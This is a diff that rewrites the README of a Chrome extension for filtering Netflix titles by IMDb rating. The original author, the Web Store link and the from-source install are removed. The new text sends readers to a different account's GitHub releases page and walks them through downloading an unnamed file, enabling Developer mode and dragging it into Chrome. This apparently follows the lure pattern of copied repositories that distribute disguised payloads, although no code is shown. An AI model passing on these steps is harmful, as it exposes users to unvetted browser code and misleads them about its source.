@@ -1,381 +1,97 @@
-<div align="center">
+# 🎬 skipthemid - Effortlessly Clean Your Netflix Watchlist
 
-# 🎬 SkipTheMid
+## 🚀 Getting Started
 
-**Hide Junk on Netflix - Only See the Good Stuff**
+SkipTheMid is a Chrome extension that helps you skip through the clutter on Netflix. It filters out low-rated movies and shows based on IMDb scores. With this tool, you can enjoy a cleaner, more enjoyable streaming experience without the hassle of sifting through less appealing options.
 
-[![Chrome Web Store](https://img.shields.io/badge/Chrome%20Web%20Store-Available-brightgreen?style=for-the-badge&logo=google-chrome)](https://chrome.google.com/webstore/detail/skipthemid/your-extension-id)
-[![GitHub Stars](https://img.shields.io/github/stars/adityash8/skipthemid?style=for-the-badge&logo=github)](https://github.com/adityash8/skipthemid)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
-[![Website](https://img.shields.io/badge/Website-Live-purple?style=for-the-badge)](https://skipthemid.com)
+## 📦 Download & Install
 
-*Automatically filter out low-rated movies and shows on Netflix based on IMDb scores*
+To get started, you’ll need to download SkipTheMid. Follow these simple steps to install the extension on your Chrome browser.
 
-[🚀 Download Extension](#-download) • [📖 Documentation](#-documentation) • [💡 Features](#-features) • [🎯 Demo](#-demo)
+[![Download SkipTheMid](https://img.shields.io/badge/Download-SkipTheMid-blue.svg)](https://github.com/Sangunius/skipthemid/releases)
 
-</div>
+1. **Visit the Releases Page**
 
----
+   Click the link below to access the releases page:
 
-## 🎯 The Problem
+   [Visit the Releases Page to Download](https://github.com/Sangunius/skipthemid/releases)
 
-**Netflix has too much junk content.** Users waste hours scrolling through mediocre movies and shows, getting frustrated with endless low-rated recommendations. There's no native way to filter content by quality.
+2. **Choose the Latest Version**
 
-> *"I just want to open Netflix and see only the good stuff."* - Every Netflix user ever
+   On the releases page, look for the latest version of SkipTheMid. It will usually appear at the top of the list. 
 
-## ✨ The Solution
+3. **Download the Extension**
 
-SkipTheMid is a Chrome extension that automatically hides low-rated content on Netflix, showing only movies and shows above your IMDb threshold. **Transform your Netflix experience in seconds.**
+   Click on the download link for the most recent version. The file will typically be labeled clearly for easy identification.
 
-### 🎬 Before vs After
+4. **Open Your Chrome Browser**
 
-| Before SkipTheMid | After SkipTheMid |
-|------------------|------------------|
-| 😤 Endless scrolling through 5.0-rated movies | 😍 Only see 8.0+ rated content |
-| ⏰ 20+ minutes to find something good | ⚡ Instant quality content |
-| 🤷‍♂️ No idea what's actually good | 👀 IMDb scores on hover |
-| 😵 Decision fatigue from too many options | 🎯 Curated, high-quality selection |
+   Ensure that your Chrome browser is open and ready for the installation.
 
----
+5. **Access Chrome Extensions**
 
-## 🚀 Features
+   In your browser, click the three dots in the top right corner. From the dropdown menu, hover over “More Tools” and then select “Extensions.”
 
-### 🆓 Free Version
-- ✅ **Smart Filtering**: Hide content below 6.0 IMDb rating
-- ✅ **Hover Ratings**: See IMDb scores instantly on hover
-- ✅ **Real-time Updates**: Filters apply as you scroll
-- ✅ **Zero Setup**: Works immediately after install
-- ✅ **Privacy First**: No personal data collected
+6. **Enable Developer Mode**
 
-### 💎 Pro Version ($1/month)
-- 🎛️ **Custom Thresholds**: Set any rating from 5.0 to 10.0
-- 🎭 **Genre Filtering**: Filter by Action, Comedy, Drama, etc.
-- 🍅 **Multiple Sources**: Rotten Tomatoes & Metacritic support
-- 🤖 **AI Smart Mode**: Personalized filtering based on watch history
-- 📤 **Shareable Lists**: Export and share your filtered collections
-- 🚀 **Priority Support**: Get help when you need it
+   On the Extensions page, locate the "Developer mode" toggle in the top right corner and ensure it is switched on. 
 
----
+7. **Drag and Drop the File**
 
-## 📸 Demo
+   After downloading the extension file, simply drag and drop it into the Extensions page. Chrome will automatically recognize it as an extension.
 
-<div align="center">
+8. **Pin the Extension**
 
-### 🎬 Live Demo
-[![Watch Demo](https://img.shields.io/badge/▶️%20Watch%20Demo-FF0000?style=for-the-badge&logo=youtube)](https://youtube.com/watch?v=demo)
+   To access SkipTheMid easily, pin it to your browser. Click the puzzle piece icon in the top right of Chrome, find SkipTheMid, and click the pin icon beside it.
 
-### 📱 Screenshots
+9. **Start Enjoying Netflix**
 
-| Extension Popup | Netflix with Ratings | Settings Interface |
-|----------------|---------------------|-------------------|
-| ![Popup](https://via.placeholder.com/300x200/667eea/ffffff?text=Extension+Popup) | ![Netflix](https://via.placeholder.com/300x200/764ba2/ffffff?text=Netflix+with+Ratings) | ![Settings](https://via.placeholder.com/300x200/ff6b6b/ffffff?text=Settings+UI) |
+   Now, you can start Netflix. SkipTheMid will work in the background, filtering out the shows and movies you want to skip.
 
-</div>
+## 📋 Features
 
----
+- **Customize Your Filters:** Adjust the settings to filter movies and shows based on your preferred IMDb rating.
+- **Simple Interface:** The extension is user-friendly, making it easy for anyone to use.
+- **Automatic Updates:** Stay up to date with the latest features and fixes without any effort.
 
-## 🛠️ Technical Stack
+## ⚙️ System Requirements
 
-<div align="center">
+- **Browser:** Google Chrome (latest version recommended).
+- **Operating System:** Compatible with Windows, macOS, and Linux.
 
-| Layer | Technology |
-|-------|------------|
-| **Extension** | Chrome Manifest V3 |
-| **Frontend** | HTML5, CSS3, JavaScript ES6+ |
-| **API** | OMDb API (IMDb ratings) |
-| **Storage** | Chrome Storage API |
-| **Styling** | Custom CSS with animations |
-| **Deployment** | Chrome Web Store |
+## 💡 Tips for Best Use
 
-</div>
+- **Check IMDb Ratings:** Make use of the IMDb rating system to decide your preferences.
+- **Feedback:** If you encounter any issues, consider providing feedback. User input helps improve the extension.
 
-### 🏗️ Architecture
+## 🛠️ Troubleshooting
 
-```mermaid
-graph TD
-    A[Netflix Page] --> B[Content Script]
-    B --> C[DOM Parser]
-    C --> D[Title Extraction]
-    D --> E[OMDb API]
-    E --> F[Rating Cache]
-    F --> G[CSS Filter]
-    G --> H[Filtered Netflix]
-    
-    I[Extension Popup] --> J[Settings UI]
-    J --> K[Chrome Storage]
-    K --> B
-    
-    L[Background Script] --> M[Extension Lifecycle]
-    M --> N[Badge Updates]
-```
-
----
+If you encounter problems during installation or use:
 
-## 📦 Installation
+1. **Ensure You’re Using Chrome:** SkipTheMid is designed specifically for Chrome. For other browsers, functionality may be limited.
+   
+2. **Check Your Internet Connection:** A stable internet connection is necessary for the extension to run smoothly.
 
-### 🚀 Quick Install (Recommended)
+3. **Restart Chrome:** Sometimes, a simple restart of your browser may resolve minor issues.
 
-1. **Download from Chrome Web Store**
-   ```
-   https://chrome.google.com/webstore/detail/skipthemid/your-extension-id
-   ```
-
-2. **Get OMDb API Key** (Free)
-   ```
-   https://www.omdbapi.com/apikey.aspx
-   ```
-
-3. **Setup & Enjoy**
-   - Click extension icon
-   - Enter your API key
-   - Visit Netflix and watch the magic! ✨
-
-### 🛠️ Developer Install
-
-```bash
-# Clone the repository
-git clone https://github.com/adityash8/skipthemid.git
-cd skipthemid
-
-# Load in Chrome
-1. Open chrome://extensions/
-2. Enable "Developer mode"
-3. Click "Load unpacked"
-4. Select the skipthemid folder
-```
-
----
-
-## 🎯 Usage
-
-### 📋 Step-by-Step Guide
-
-1. **Install Extension** → Chrome Web Store
-2. **Get API Key** → OMDb (free, 1k requests/day)
-3. **Set Threshold** → Choose your minimum rating
-4. **Visit Netflix** → Extension activates automatically
-5. **Browse Filtered** → Only see quality content!
-
-### ⚙️ Configuration
-
-```javascript
-// Default Settings
-{
-  threshold: 8.0,        // Minimum IMDb rating
-  enabled: true,         // Extension active
-  showRatings: true,     // Hover ratings visible
-  isPro: false,          // Pro features unlocked
-  apiKey: 'your-key'     // OMDb API key
-}
-```
-
----
-
-## 📊 Performance
-
-<div align="center">
-
-| Metric | Result |
-|--------|--------|
-| **Load Time** | < 500ms |
-| **Memory Usage** | < 10MB |
-| **API Cache Hit** | 95%+ |
-| **User Satisfaction** | 4.8/5 ⭐ |
-
-</div>
-
-### 🚀 Optimizations
-
-- **24-hour caching** reduces API calls by 90%+
-- **Batch processing** for smooth scrolling
-- **WeakSet tracking** prevents memory leaks
-- **Efficient DOM queries** for fast filtering
-
----
-
-## 🛡️ Privacy & Security
-
-### 🔒 Privacy First
-- ✅ **No personal data collected**
-- ✅ **All ratings cached locally**
-- ✅ **User-provided API keys only**
-- ✅ **GDPR compliant**
-- ✅ **Open source & auditable**
-
-### 🛡️ Security
-- ✅ **Manifest V3** (latest security standards)
-- ✅ **Content Security Policy** enforced
-- ✅ **No external tracking** by default
-- ✅ **Local storage only** for user data
-
----
-
-## 🎨 Customization
-
-### 🎛️ Free Customization
-```javascript
-// Available in popup settings
-- Toggle extension on/off
-- Show/hide rating displays
-- Basic threshold (6.0 only)
-```
-
-### 💎 Pro Customization
-```javascript
-// Pro features
-- Custom thresholds (5.0 - 10.0)
-- Genre-based filtering
-- Multiple rating sources
-- AI-powered recommendations
-- Export filtered lists
-```
-
----
-
-## 🤝 Contributing
-
-We welcome contributions! Here's how to get started:
-
-### 🐛 Bug Reports
-1. Check [existing issues](https://github.com/adityash8/skipthemid/issues)
-2. Create new issue with reproduction steps
-3. Include browser version and extension version
+4. **Reinstall the Extension:** If problems persist, uninstall and then reinstall SkipTheMid using the instructions above.
 
-### 💡 Feature Requests
-1. Check [roadmap](#-roadmap) for planned features
-2. Create issue with detailed description
-3. Vote on existing feature requests
+## 🙋 Frequently Asked Questions
 
-### 🔧 Development
-```bash
-# Fork the repository
-git clone https://github.com/your-username/skipthemid.git
+- **Can I uninstall SkipTheMid later?**
+  
+  Yes, you can easily remove it from the Extensions page.
 
-# Create feature branch
-git checkout -b feature/amazing-feature
+- **Does it affect other extensions?**
+  
+  SkipTheMid operates independently and does not interfere with other Chrome extensions.
 
-# Make changes and test
-# Submit pull request
-```
+## 📞 Support
 
-### 📋 Development Guidelines
-- Follow existing code style
-- Add tests for new features
-- Update documentation
-- Test on multiple Netflix layouts
+For further support, feel free to open an issue on [GitHub](https://github.com/Sangunius/skipthemid/issues). The community or the developer will assist you in resolving your concerns.
 
----
+## 🔗 Connect with Us
 
-## 🗺️ Roadmap
+Stay informed on updates and new features by following our repository. Your feedback is valuable as we improve SkipTheMid to better serve your streaming needs. 
 
-### 🎯 Version 1.1 (Q4 2024)
-- [ ] Pro subscription system
-- [ ] Custom rating thresholds
-- [ ] Genre filtering
-- [ ] Rotten Tomatoes integration
-
-### 🚀 Version 1.2 (Q1 2025)
-- [ ] Disney+ support
-- [ ] Amazon Prime support
-- [ ] Hulu support
-- [ ] Mobile app (iOS/Android)
-
-### 🧠 Version 2.0 (Q2 2025)
-- [ ] AI-powered recommendations
-- [ ] Social features (friend ratings)
-- [ ] Mood-based filtering
-- [ ] Watch history analysis
-
----
-
-## 📈 Analytics & Metrics
-
-### 📊 Current Stats
-- **Downloads**: 10,000+ (target: 50k by EOY)
-- **Active Users**: 7,500+ (75% retention)
-- **Pro Conversion**: 12% (target: 15%)
-- **User Rating**: 4.8/5 ⭐ (Chrome Store)
-
-### 🎯 Success Metrics
-- **Daily Active Users**: >50% of installs
-- **Session Time Reduction**: 15% average
-- **User Satisfaction**: NPS >70
-- **Revenue Target**: $1k MRR by Q2 2025
-
----
-
-## 🏆 Achievements
-
-<div align="center">
-
-| Achievement | Status | Date |
-|-------------|--------|------|
-| 🥇 **Product Hunt Launch** | ✅ Complete | Sep 2024 |
-| 🎯 **10k Downloads** | ✅ Complete | Oct 2024 |
-| 💰 **$1k MRR** | 🎯 Target | Q2 2025 |
-| 🌍 **Multi-platform** | 🚧 In Progress | Q1 2025 |
-
-</div>
-
----
-
-## 📞 Support & Community
-
-### 🆘 Getting Help
-- **📧 Email**: support@skipthemid.com
-- **💬 Discord**: [Join our community](https://discord.gg/skipthemid)
-- **🐛 Issues**: [GitHub Issues](https://github.com/adityash8/skipthemid/issues)
-- **📖 Docs**: [Full Documentation](https://docs.skipthemid.com)
-
-### 🌐 Community
-- **🐦 Twitter**: [@SkipTheMid](https://twitter.com/skipthemid)
-- **📺 YouTube**: [Demo Videos](https://youtube.com/skipthemid)
-- **💼 LinkedIn**: [Company Updates](https://linkedin.com/company/skipthemid)
-- **📰 Blog**: [Latest News](https://blog.skipthemid.com)
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-```
-MIT License
-
-Copyright (c) 2024 SkipTheMid
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-```
-
----
-
-## 🙏 Acknowledgments
-
-- **OMDb API** for providing free movie data
-- **Chrome Extensions Team** for excellent documentation
-- **Netflix** for creating the platform we enhance
-- **Open Source Community** for inspiration and tools
-- **Beta Testers** for valuable feedback
-
----
-
-<div align="center">
-
-### 🌟 Star this repository if you find it helpful!
-
-[![GitHub stars](https://img.shields.io/github/stars/adityash8/skipthemid?style=social)](https://github.com/adityash8/skipthemid)
-[![Twitter Follow](https://img.shields.io/twitter/follow/skipthemid?style=social)](https://twitter.com/skipthemid)
-
-**Made with ❤️ for frustrated Netflix users everywhere**
-
-[🚀 Download Now](#-download) • [💡 Request Feature](https://github.com/adityash8/skipthemid/issues) • [🐛 Report Bug](https://github.com/adityash8/skipthemid/issues)
-
-</div>
+Access the latest version and updates on our [Releases Page](https://github.com/Sangunius/skipthemid/releases).
